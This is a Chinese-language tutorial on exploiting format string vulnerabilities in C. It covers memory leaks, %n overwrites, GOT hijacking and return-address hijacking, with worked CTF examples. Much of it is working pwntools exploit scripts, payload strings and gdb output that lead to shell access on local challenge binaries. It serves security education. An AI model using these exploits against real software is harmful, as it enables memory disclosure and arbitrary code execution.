# 格式化字符串漏洞


</br>

## 格式化字符串函数
### 格式化字符串
格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。一般来说，格式化字符串在利用的时候主要分为三个部分
- 格式化字符串函数
- 格式化字符串
- 后续参数（可选）


常见输出格式化字符串：

<style>
table th:first-of-type {
        width: 350px; //设置表格样式
}
</style>

| 函数 | 功能 |
| --- | --- |
| printf   | 输出到stdout |
| fprintf  | 输出到指定FILE流 |
| vprintf  | 根据参数列表格式化输出到 stdout |
| vfprintf | 根据参数列表格式化输出到指定FILE流 |
| sprintf  | 输出到字符串 |
| snprintf | 输出指定字节数到字符串 |
| vsprintf | 根据参数列表格式化输出到字符串 |
| vsnprintf | 根据参数列表格式化输出指定字节到字符串 |
| setproctitle | 设置argv |
| syslog   | 输出日志 |


格式化字符串的结构如下
```c
%[parameter][flags][field width][.precision][length]type
```
- parameter：n$，获取格式化字符串中的指定参数
- flag
- field width：输出的最小宽度
- precision：输出的最大长度
- length，输出的长度
    - hh，输出一个字节
    - h，输出一个双字节 ​
- type
    - d/i 以十进制形式输出带符号整数
    - u 以十进制形式输出无符号整数
    - x/X 以十六进制形式输出无符号整数，x使用小写字母；X使用大写字母
    - o 以八进制形式输出无符号整数
    - s 输出字符串
    - c 单个字符
    - p 指针
    - n 输出成功的字符个数写入对应的整型指针参数所指的变量。
    - % 字符"%"

## 格式化字符串漏洞原理
格式化字符串函数根据格式化字符串来进行解析。正常的printf函数是被解析的参数个数要和格式化字符串一一对应，这样就可以正常输出。

在进入printf之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况
- 当前字符不是%，直接输出到相应标准输出。
- 当前字符是%， 继续读取下一个字符
    - 如果没有字符，报错
    - 如果下一个字符是%,输出%
    - 否则根据相应的字符，获取相应的参数，对其进行解析并输出

![](/Fmtstr.assets/printf.png)

但是如果在编写程序的时候，没有提供被解析的参数，程序会怎么样？
```c
printf("Color %s, Number %d, Float %4.2f");
```
当printf函数没有提供任何参数，程序依旧会执行，它会将栈上存储格式化字符串地址上面的三个变量分别解析为
- 解析其地址对应的字符串
- 解析其内容对应的整形值
- 解析其内容对应的浮点值

对于第一种情况来说，如果提供了一个不可访问地址，比如0，那么程序就会因此而崩溃。

## 格式化字符串漏洞利用
### 程序崩溃
通常来说，利用格式化字符串漏洞使得程序崩溃是最为简单的利用方式，只需要输入若干个%s即可
```c
%s%s%s%s%s%s%s%s%s%s%s%s%s%s
```
因为栈上不可能每个值都对应了合法的地址，所以总是会有某个地址可以使得程序崩溃。如果远程服务有一个格式化字符串漏洞，那么我们就可以攻击其可用性，使服务崩溃，进而使得用户不能够访问。

### 泄露内存
#### 泄露栈内存
例如
```c
#include <stdio.h>

int main() {
  char s[100];
  int a = 1, b = 0x22222222, c = -1;
  scanf("%s", s);
  printf("%08x.%08x.%08x.%s\n", a, b, c, s);
  printf(s);
  return 0;
}
```
编译
```bash
gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c
```
通过gdb来调试程序，在第一个printf处下断点
```c
pwndbg> b printf
Breakpoint 1 at 0x8048330
```
运行程序，输入%08x.%08x.%08x
```c
pwndbg> r
Starting program: /home/gnq/test/leakmemory 
%08x.%08x.%08x
```
查看栈空间
```c
pwndbg> stack 10
00:0000│ esp  0xffffceec —▸ 0x80484bf (main+84) ◂— add    esp, 0x20
01:0004│      0xffffcef0 —▸ 0x8048563 ◂— and    eax, 0x2e783830 /* '%08x.%08x.%08x.%s\n' */
02:0008│      0xffffcef4 ◂— 0x1
03:000c│      0xffffcef8 ◂— 0x22222222 ('""""')
04:0010│      0xffffcefc ◂— 0xffffffff
05:0014│      0xffffcf00 —▸ 0xffffcf10 ◂— '%08x.%08x.%08x'
... ↓
07:001c│      0xffffcf08 ◂— 0xc2
08:0020│      0xffffcf0c —▸ 0xf7e9379b (handle_intel+107) ◂— add    esp, 0x10
09:0024│ eax  0xffffcf10 ◂— '%08x.%08x.%08x'
```
![](/Fmtstr.assets/leakmemory.png)

可以看到第一个%08x解析的是a的值0x1，第二个%08x解析的是b的值0x22222222，第三个%08x解析的是c的值0xffffffff即-1，后面的%s解析的是我们输入的值即%08x.%08x.%08x

通过gdb的c命令继续执行程序，可以验证和我们猜想的结果一样
```c
pwndbg> c
Continuing.
00000001.22222222.ffffffff.%08x.%08x.%08x
```
现在程序断在了第二个printf函数处，看一下此时的栈空间
```c
pwndbg> stack 10
00:0000│ esp  0xffffcefc —▸ 0x80484ce (main+99) ◂— add    esp, 0x10
01:0004│      0xffffcf00 —▸ 0xffffcf10 ◂— '%08x.%08x.%08x'
... ↓
03:000c│      0xffffcf08 ◂— 0xc2
04:0010│      0xffffcf0c —▸ 0xf7e9379b (handle_intel+107) ◂— add    esp, 0x10
05:0014│ eax  0xffffcf10 ◂— '%08x.%08x.%08x'
06:0018│      0xffffcf14 ◂— '.%08x.%08x'
07:001c│      0xffffcf18 ◂— 'x.%08x'
08:0020│      0xffffcf1c ◂— 0x7838 /* '8x' */
09:0024│      0xffffcf20 —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x23f40
```
因为第二个printf函数没有参数，导致了格式化字符串漏洞，%08x.%08x.%08x会解析栈上的地址。第一个%08x解析的是0xffffcf10，第二个%08x解析的是0xc2，第三个%08x解析的是0xf7e9379b

![](/Fmtstr.assets/leakmemory2.png)

通过gdb验证，证明和猜想的一样
```c
pwndbg> c
Continuing.
ffffcf10.000000c2.f7e9379b[Inferior 1 (process 55700) exited normally]
```
**这里需要注意的是，并不是每次得到的结果都一样 ，因为栈上的数据会因为每次分配的内存页不同而有所不同，这是因为栈是不对内存页做初始化的。**

上面都是依次获得栈中的每个参数，那有没有可能直接获取栈上参数的值呢？我们可以通过`%n$x`来获取栈上第n+1个参数的值。为什么是n+1参数的值，因为格式化参数里面的n指的是该格式化字符串对应的第n个输出参数。而格式化字符串本身就是printf函数的一个参数，所以相对于输出函数printf来说，就是第n+1个参数了。

用gdb调试程序，输入%3$x
```c
gdb-peda$ b printf
Breakpoint 1 at 0x8048330
gdb-peda$ r
Starting program: /home/gnq/test/leakmemory 
%3$x
....
gdb-peda$ c
...
gdb-peda$ stack 10
0000| 0xffffcefc --> 0x80484ce (<main+99>:	add    esp,0x10)
0004| 0xffffcf00 --> 0xffffcf10 ("%3$x")
0008| 0xffffcf04 --> 0xffffcf10 ("%3$x")
0012| 0xffffcf08 --> 0xc2 
0016| 0xffffcf0c --> 0xf7e9379b (<handle_intel+107>:	add    esp,0x10)
0020| 0xffffcf10 ("%3$x")
0024| 0xffffcf14 --> 0xffffd000 --> 0x1 
0028| 0xffffcf18 --> 0xe0 
0032| 0xffffcf1c --> 0x0 
0036| 0xffffcf20 --> 0xf7ffd000 --> 0x23f40 
```
可以看到%3$x打印出来了printf的第四个参数的值
```c
gdb-peda$ c
Continuing.
f7e9379b[Inferior 1 (process 56607) exited normally]
```

#### 获取栈变量对应字符串
只需要将`%n$x`改成`%n$s`就可以获取在栈上对应的字符串，步骤和上面泄露内存地址一样。但是需要注意并不是所有的地址都可以被解析成字符串，如果不能解析成字符串，那么程序就会崩溃

#### 技巧小总结
- 利用%x来获取对应栈的内存，但建议使用%p，可以不用考虑位数的区别。
- 利用%s来获取变量所对应地址的内容，只不过有零截断。
- 利用%order$x来获取指定参数的值，利用%order$s来获取指定参数对应地址的内容。

#### 泄露任意地址内存
如果可以泄露某个libc函数中的got表地址，那么就可以获取libc版本和取其他函数的地址。那要如何才可以泄露某个地址的内存？

一般来说，在格式化字符串漏洞中，我们所读取的格式化字符串都是在栈上的，在调用输出函数的时候，第一个参数的值其实就是该格式化字符串的地址。由于我们可以控制该格式化字符串，如果我们知道该格式化字符串在输出函数调用时是第几个参数，这里假设该格式化字符串相对函数调用为第k个参数。那我们就可以通过如下的方式来获取某个指定地址addr的内容。
```c
addr%k$s
```
如何确定该格式化字符串为第几个参数，我们可以通过下面这种方式来确定。
```c
[tag]%p%p%p%p%p%p
```
一般来说，我们会重复某个字符的机器字长来作为tag，而后面会跟上若干个%p来输出栈上的内容，如果内容与我们前面的tag重复了，那么我们就可以有很大把握说明该地址就是格式化字符串的地址。
```c
gnq@gnq:~/test$ ./leakmemory 
aaaa.%p.%p.%p.%p.%p.%p
00000001.22222222.ffffffff.aaaa.%p.%p.%p.%p.%p.%p
aaaa.0xffffcf40.0xc2.0xf7e9379b.0x61616161.0x2e70252e.0x252e7025g
```
可以看到0x61616161是输出函数的第五个参数，也就是格式化字符串的第四个参数。

如果此时把aaaa替换成某个函数的got表地址，那么程序就会打印出这个函数的真实地址。以scanf函数为例，获取scanf_got的值
```python
from pwn import *
p = process('./leakmemory')
leakmemory = ELF('./leakmemory')
scanf_got = leakmemory.got['__isoc99_scanf']
print hex(scanf_got)
payload = p32(scanf_got) + '%4$s'

p.sendline(payload)
p.recvuntil('%4$s\n')
print hex(u32(p.recv()[4:8]))

p.interactive()
```

<br/>

### 覆盖内存
只要变量对应的地址可写，我们就可以利用格式化字符串来修改其对应的数值。这里需要用到`%n`这个特殊的参数类型。之前提到`%n`可以将输出成功的字符个数写入对应的整型指针参数所指的变量。

一般来说，如下步骤
- 确定覆盖地址
- 确定相对偏移
- 进行覆盖

以下面为例
```c
#include <stdio.h>

int a = 123, b = 456;
int main() {
  int c = 789;
  char s[100];
  printf("%p\n", &c);
  scanf("%s", s);
  printf(s);
  if (c == 16) {
    puts("modified c.");
  } else if (a == 2) {
    puts("modified a for a small number.");
  } else if (b == 0x12345678) {
    puts("modified b for a big number!");
  }
  return 0;
}
```
编译
```bash
gcc -m32 -fno-stack-protector -no-pie -o overwrite overwrite.c
```

#### 覆盖栈内存
需要将局部变量c的值修改成16，程序已经给了变量c的地址，下一步就是获取相对偏移
```bash
gnq@gnq:~/test$ ./overwrite
0xffffcfac
aaaa.%p.%p.%p.%p.%p.%p 
aaaa.0xffffcf48.0xc2.0xf7e9379b.0xffffcf6e.0xffffd06c.0x61616161
```
通过测试，可以知道变量c在格式化字符串的第六个参数。现在就可以通过%n来构造payload
```python
c_addr + %012d + %6$n
```
因为c_addr已经占了4个字节，还需要补充12个字节才到16字节，再通过%6$n将变量c修改成16
```python
from pwn import *

p=process("./overwrite")
c_addr=int(p.recv(10),16)
print c_addr

payload = p32(c_addr) + '%012d' + '%6$n'
p.sendline(payload)

p.interactive()
```

### 覆盖任意地址内存
#### 覆盖小数字
需要将变量a的值覆盖成2，如果我们还是将要覆盖的地址放在最前面，那么将直接占用机器字长个(4或8)字节。显然，无论之后如何输出，都只会比2大。仔细想一下，有必要将所要覆盖的变量的地址放在字符串的最前面么？只要把地址放在中间，只要能够找到对应的偏移，其照样也可以得到对应的数值。

我们可以将payload修改一下，前面两个aa是让变量a赋值为2，而最后的xx作为补位（32位字长位4），这样第六位参数就为`aa%k`，第七位参数为`$nxx`，a_addr为第八位参数，所以这里的`k`为8。
```c
'aa%k' + '$nxx' + p32(a_addr)
```
通过IDA找到a的地址
```c
.data:0804A024                 public a
.data:0804A024 a               dd 7Bh      
```
最终利用代码如下
```python
from pwn import *

p=process("./overwrite")
a_addr=0x0804A024

payload ='aa%8' + '$naa' + p32(a_addr)
p.sendline(payload)

p.interactive()
```

#### 覆盖大数字
需要将变量b的值覆盖成0x12345678，如果直接一次性输入那么大的数字来覆盖，可能会因为传送的数值过大，导致失败，就算传送成功，那么大的值也可能导致程序崩溃。那么有没有办法可以覆盖呢？

我们知道x86和x64的体系结构中，变量的存储格式为以小端存储，即最低有效位存储在低地址。举个例子，0x12345678在内存中由低地址到高地址依次为\x78\x56\x34\x12。而格式化字符串中有两个标志位
- hh 对于整数类型，printf期待一个从char提升的int尺寸的整型参数。
- h  对于整数类型，printf期待一个从short提升的int尺寸的整型参数。

这就意味着我们可以利用`%hhn`向某个地址写入单字节，利用`%hn`向某个地址写入双字节

变量b的地址为0x0804A028，那么就可以按照单字节写入的方式进行覆盖
```c
0x0804A028 \x78
0x0804A029 \x56
0x0804A02a \x34
0x0804A02b \x12
```
如果把b_addr放到格式化字符串的第六个参数位，然后通过%6$n将0x78写入，以此类推，将b_addr+1的地址放到第七位，用%7$n写入0x56，b_addr+2的地址放到第八位，用%8$n写入0x34，最后b_addr+3的地址放入第九位参数位，用%9$n写入0x12。就可以成功覆盖变量b为0x12345678
对应的payload
```python
p32(b_addr)+p32(b_addr+1)+p32(b_addr+2)+p32(b_addr+3)+pad1+'%6$n'+pad2+'%7$n'+pad3+'%8$n'+pad4+'%9$n'
```
pad1：因为前面四个地址已经占了16（0x10）字节了，所以还需要104（0x78-0x10=0x68）个字节，所以`pad1为%104c`
pad2：前面已经输出了120个字节，而%hhn写入的是单字节，只取后面的0x56，所以还需要222（0x156-0x78）个字节，所以`pad2为%222c`
pad3：前面已经输出了342（120+222）个字节，因为同样是%hhn为单字节，只取0x34，还需要222（0x234-0x156）字节，所以`pad3为%222c`
pad4：前面已经输出了564（120+222+222）个字节，还需要222（0x312-0x234）个字节。所以`pad4为%222c`

最终利用代码如下
```python
from pwn import *

p=process("./overwrite")
b_addr=0x0804A028

payload=p32(b_addr)+p32(b_addr+1)+p32(b_addr+2)+p32(b_addr+3)+'%104c'+'%6$n'+'%222c'+'%7$n'+'%222c'+'%8$n'+'%222c'+'%9$n'
p.sendline(payload)

p.interactive()
```
也可以使用pwntools的自带的工具
```python
from pwn import *

p = process('./overwrite')
b_addr=0x0804A028
p.sendline(fmtstr_payload(6, {0x804A028:0x12345678}))

p.interactive()
```

<br/>

## 格式化字符串漏洞例子
64 位的偏移计算和 32 位类似，都是算对应的参数。只不过 64 位函数的前 6 个参数是存储在相应的寄存器中。

### x64格式化字符串漏洞
以[UIUCTF pwn200 GoodLuck](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck)为例

查看程序保护,开启了 NX 保护和部分 RELRO 保护
```bash
gnq@gnq:~/test$ checksec goodluck 
[*] '/home/gnq/test/goodluck'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
printf函数没有参数，存在格式化字符串漏洞，而题目需要利用格式化字符串漏洞的读取在栈中的flag
```c
 for ( j = 0; j <= 21; ++j )
  {
    v4 = format[j];
    if ( !v4 || v10[j] != v4 )
    {
      puts("You answered:");
      printf(format);      // 格式化字符串漏洞
      puts("\nBut that was totally wrong lol get rekt");
      fflush(_bss_start);
      return 0;
    }
  }
```
用gdb调试，在printf函数下个断点
```c
pwndbg> b printf
Breakpoint 1 at 0x400640
pwndbg> r
Starting program: /home/gnq/test/goodluck 
what's the flag
aaaa
```
查看寄存器和栈的状态
```c
 RAX  0x0
 RBX  0x0
 RCX  0x7ffff7b04380 (__write_nocancel+7) ◂— cmp    rax, -0xfff
 RDX  0x7ffff7dd3780 (_IO_stdfile_1_lock) ◂— 0x0
 RDI  0x602830 ◂— 0x61616161 /* 'aaaa' */
 RSI  0x602010 ◂— 'You answered:\ng\n'
 R8   0x7ffff7fdc700 ◂— 0x7ffff7fdc700
 R9   0x7ffff7fdc701 ◂— 0x1000007ffff7fdc7
 R10  0x25b
 R11  0x7ffff7a62810 (printf) ◂— sub    rsp, 0xd8
 R12  0x4006b0 (_start) ◂— xor    ebp, ebp
 R13  0x7fffffffde70 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdd90 —▸ 0x400900 (__libc_csu_init) ◂— push   r15
 RSP  0x7fffffffdd48 —▸ 0x400890 (main+234) ◂— mov    edi, 0x4009b8
 RIP  0x7ffff7a62810 (printf) ◂— sub    rsp, 0xd8
──────────────────────────────[ DISASM ]─────────────────────────────────
   0x7ffff7a62817 <printf+7>      test   al, al
   0x7ffff7a62819 <printf+9>      mov    qword ptr [rsp + 0x28], rsi
   0x7ffff7a6281e <printf+14>     mov    qword ptr [rsp + 0x30], rdx
   0x7ffff7a62823 <printf+19>     mov    qword ptr [rsp + 0x38], rcx
   0x7ffff7a62828 <printf+24>     mov    qword ptr [rsp + 0x40], r8
   0x7ffff7a6282d <printf+29>     mov    qword ptr [rsp + 0x48], r9
   0x7ffff7a62832 <printf+34>     je     printf+91 <0x7ffff7a6286b>
    ↓
   0x7ffff7a6286b <printf+91>     lea    rax, [rsp + 0xe0]
   0x7ffff7a62873 <printf+99>     mov    rsi, rdi
   0x7ffff7a62876 <printf+102>    lea    rdx, [rsp + 8]
───────────────────────────────[ STACK ]─────────────────────────────────
00:0000│ rsp  0x7fffffffdd48 —▸ 0x400890 (main+234) ◂— mov    edi, 0x4009b8  //返回地址
01:0008│      0x7fffffffdd50 ◂— 0x61000001  // 偏移1
02:0010│      0x7fffffffdd58 —▸ 0x602830 ◂— 0x61616161 /* 'aaaa' */ // 偏移2
03:0018│      0x7fffffffdd60 —▸ 0x602010 ◂— 'You answered:\ng\n'  // 偏移3 
04:0020│      0x7fffffffdd68 —▸ 0x7fffffffdd70 ◂— 0x3333327b67616c66 ('flag{233')  // 偏移4 
05:0028│      0x7fffffffdd70 ◂— 0x3333327b67616c66 ('flag{233')
06:0030│      0x7fffffffdd78 ◂— 0xffffffffffff0a7d
07:0038│      0x7fffffffdd80 ◂— 0xffffffffffff
```
可以看到flag在栈的偏移值为5，去掉第一个的返回地址，在栈上偏移则为4。因为程序为64位，而格式化字符串是printf函数的第一个参数，所以存放在寄存器rdi中，其他5个寄存器（rsi, rdx, rcx, r8, r9）则存放其他参数。那么实际偏移地址是寄存器加栈上偏移：5+4=9 

最终利用代码如下
```python
from pwn import *

p = process('./goodluck')

payload='%9$s'
p.sendline(payload)

p.interactive()
```

### hijack GOT
在没有开启 RELRO 保护的前提下，每个 libc 的函数对应的 GOT 表项是可以被修改的。因此，我们可以修改某个 libc 函数的 GOT 表内容为另一个 libc 函数的地址来实现对程序的控制。比如把printf_got修改成system_got，那么下次执行的printf的时候实际上执行的是systen函数


以[2016 CCTF pwn3](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2016-CCTF-pwn3)为例
查看保护
```c
gnq@gnq:~/test$ checksec pwn3 
[*] '/home/gnq/test/pwn3'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
通过IDA分析可以该程序有三个功能，put、dir、get。其中`get`存在格式化字符串漏洞
```c
int get_file()
{
  char dest; // [esp+1Ch] [ebp-FCh]
  char s1; // [esp+E4h] [ebp-34h]
  char *i; // [esp+10Ch] [ebp-Ch]

  printf("enter the file name you want to get:");
  __isoc99_scanf("%40s", &s1);
  if ( !strncmp(&s1, "flag", 4u) )
    puts("too young, too simple");
  for ( i = file_head; i; i = *(i + 60) )
  {
    if ( !strcmp(i, &s1) )
    {
      strcpy(&dest, i + 0x28);
      return printf(&dest);   // 格式化字符串漏洞
    }
  }
  return printf(&dest);
}
```
这里需要注意的是`ask_username`通过for循环把输入的字符都加一，然后再与`ask_password`验证，所以这里应该输入的是`rxraclhm`。
```c
char *__cdecl ask_username(char *dest)
{
  char src[40]; // [esp+14h] [ebp-34h]
  int i; // [esp+3Ch] [ebp-Ch]

  puts("Connected to ftp.hacker.server");
  puts("220 Serv-U FTP Server v6.4 for WinSock ready...");
  printf("Name (ftp.hacker.server:Rainism):");
  __isoc99_scanf("%40s", src);
  for ( i = 0; i <= 39 && src[i]; ++i )
    ++src[i];
  return strcpy(dest, src);
}
```
```c
int __cdecl ask_password(char *s1)
{
  if ( strcmp(s1, "sysbdmin") )
  {
    puts("who you are?");
    exit(1);
  }
  return puts("welcome!");
}
```
利用思路：利用get功能的格式化字符串漏洞泄露出puts_got，然后获取puts函数的地址，从而获取libc的基址，计算system函数的地址。将puts_got修改成system的地址。当执行puts("/bin/sh")函数时，实际上就是执行system("/bin/sh")。

用gdb调试看看格式化字符串的偏移，在get功能函数的printf（0x0804889E）下断点，可以看到偏移为7

![](/Fmtstr.assets/pwn3.png)

![](/Fmtstr.assets/pwn3_2.png)

最终利用代码如下
```python
#!coding:utf-8

from pwn import *
#context.log_level='debug'

r=process("./pwn3")
elf=ELF("./pwn3")
libc=ELF("./libc.so")

puts_got=elf.got['puts']

def passwd():
	password=''
	for i in 'sysbdmin':
		password+=chr(ord(i)-1)

	return password

def name():
	r.recvuntil("Name (ftp.hacker.server:Rainism):")
	r.sendline(passwd())

def put(name,content):
	r.sendline('put')
	r.recvuntil("please enter the name of the file you want to upload:")
	r.sendline(name)
	r.recvuntil('then, enter the content:')
	r.sendline(content)

def dir():
	r.sendline("dir")

def get(name):
	r.sendline("get")
	r.recvuntil("enter the file name you want to get:")
	r.sendline(name)
	data=r.recv()

	return data

# 输入rxraclhm
name()

# 泄露puts_got
#put("test",p32(puts_got)+"%7$s")
#puts_addr=u32(get("test")[4:8])

put("test","%8$s"+p32(puts_got))
puts_addr=u32(get("test")[:4])
print ("puts_addr: "+ hex(puts_addr))

# 通过libc偏移计算system函数的地址
libc_base=puts_addr-libc.symbols['puts']
system_addr=libc_base+libc.symbols['system']

# payload:将puts_got修改成system_addr
payload = fmtstr_payload(7, {puts_got: system_addr})

# 写入/bin/sh和payload
put("/bin/sh;",payload)

# 通过get触发格式化字符串漏洞
r.sendline("get")
r.recvuntil("enter the file name you want to get:")
r.sendline("/bin/sh;")

#由于got表已经被覆写，实际上执行的是system("/bin/sh")
dir()

r.interactive()
```

### hijack retaddr
利用格式化字符串漏洞来劫持程序的返回地址到我们想要执行的地址，以[三个白帽-pwnme_k0](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/%E4%B8%89%E4%B8%AA%E7%99%BD%E5%B8%BD-pwnme_k0)为例

程序开启了NX和Full RELRO，这样就无法使用shellcode和修改got表
```c
gnq@gnq:~/test$ checksec pwnme_k0
[*] '/home/gnq/test/pwnme_k0'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
用IDA可以发现程序的`Sh0w Account Infomation`存在格式化字符串漏洞
```c
int __fastcall sub_400B07(char format, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, char formata, __int64 a8, __int64 a9)
{
  write(0, "Welc0me to sangebaimao!\n", 0x1AuLL);
  printf(&formata, "Welc0me to sangebaimao!\n");
  return printf(&a9 + 4); //格式化字符串漏洞
}
```
而且程序中还可以直接调用system("/bin/sh")，那么只需要将返回地址控制到0x4008A6就可以getshell了
```c
.text:00000000004008A6 sub_4008A6      proc near
.text:00000000004008A6 ; __unwind {
.text:00000000004008A6                 push    rbp
.text:00000000004008A7                 mov     rbp, rsp
.text:00000000004008AA                 mov     edi, offset command ; "/bin/sh"
.text:00000000004008AF                 call    system
.text:00000000004008B4                 pop     rdi
.text:00000000004008B5                 pop     rsi
.text:00000000004008B6                 pop     rdx
.text:00000000004008B7                 retn
```
用gdb调试程序，将断点下在有漏洞的printf函数上（0x400B39），然后输入用户名aaaaaaaa，密码%p.%p.%p.%p.%p.%p，再输入1查看
```c
pwndbg> b *0x400B39
Breakpoint 1 at 0x400b39
pwndbg> r
...
Register Account first!
Input your username(max lenth:20): 
aaaaaaaa
Input your password(max lenth:20): 
%p.%p.%p.%p.%p.%p     
Register Success!!
1.Sh0w Account Infomation!
2.Ed1t Account Inf0mation!
3.QUit sangebaimao:(
>1
....
```
查看栈空间，在栈上偏移2（第七个参数）的是返回地址，只要将这个地址改掉就可以。我们知道存储返回地址的内存本身是动态变化的，但是其相对于 rbp 的地址并不会改变，所以我们可以使用相对地址来计算。而栈上偏移1存储的就是上一个函数的rbp，所以偏移为 0x7fffffffdce0 - 0x7fffffffdca8 = 0x38。

这样就可以用格式化字符串漏洞把第六个参数读取出来，然后通过偏移得到返回地址，再用格式化字符串漏洞将返回地址覆盖

![](/Fmtstr.assets/pwnme_k0.png)

因为0x4008AA和0x400D74只有低2字节不一样，只需要修改0x7fffffffdca8开始的2个字节
```python
from pwn import *
#context.log_level='debug'

p=process("pwnme_k0")
elf=ELF("pwnme_k0")


p.recvuntil("Input your username(max lenth:20):")
p.sendline("a*8")
p.recvuntil("Input your password(max lenth:20):")
p.sendline("%6$p")

p.recvuntil(">")
p.sendline("1")

p.recvuntil("0x")
ret_addr=int(p.recvline().strip(),16) - 0x38
print ("ret_addr: ",hex(ret_addr))

p.recvuntil(">")
p.sendline("2")

p.recvuntil("please input new username(max lenth:20): ")
p.sendline(p64(ret_addr))
p.recvuntil("please input new password(max lenth:20): ")
p.sendline("%2218d%8$hn")

p.recvuntil(">")
p.sendline("1")

p.interactive()
```

## 参考
[格式化字符串漏洞利用](https://wiki.x10sec.org/pwn/fmtstr/fmtstr_exploit/#_15)

[格式化字符串漏洞例子](https://wiki.x10sec.org/pwn/fmtstr/fmtstr_example/)

[好好说话之格式化字符串漏洞利用](https://blog.csdn.net/qq_41202237/article/details/107662273)



